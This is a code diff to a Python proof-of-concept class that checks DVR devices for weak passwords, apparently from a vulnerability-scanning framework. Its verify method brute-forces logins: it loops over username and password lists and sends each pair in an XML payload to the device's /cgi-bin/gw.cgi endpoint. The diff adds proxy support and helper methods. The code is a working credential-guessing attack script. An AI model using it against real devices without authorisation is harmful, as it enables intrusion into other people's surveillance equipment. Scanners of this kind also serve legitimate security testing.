@@ -17,12 +17,13 @@ class DvrWeakPassword(POCTemplate):
         self.desc = ''
 
     def verify(self, ip, port=80):
-        headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}
+        headers = self._get_headers()
+        proxies = self._get_proxies()
         for user in self.config.users:
             for password in self.config.passwords:
-                url = f'http://{ip}:{port}/cgi-bin/gw.cgi?xml=<juan ver="" squ="" dir="0"><rpermission usr="{user}" pwd="{password}"><config base=""/><playback base=""/></rpermission></juan>'
+                url = self._get_url(ip, port, f'/cgi-bin/gw.cgi?xml=<juan ver="" squ="" dir="0"><rpermission usr="{user}" pwd="{password}"><config base=""/><playback base=""/></rpermission></juan>')
                 try:
-                    r = requests.get(url, headers=headers, verify=False, timeout=self.config.timeout)
+                    r = requests.get(url, headers=headers, verify=False, timeout=self.config.timeout, proxies=proxies)
                     if r.status_code == 200 and '<rpermission' in r.text:
                         items = r.text.split()
                         idx = items.index('<rpermission')
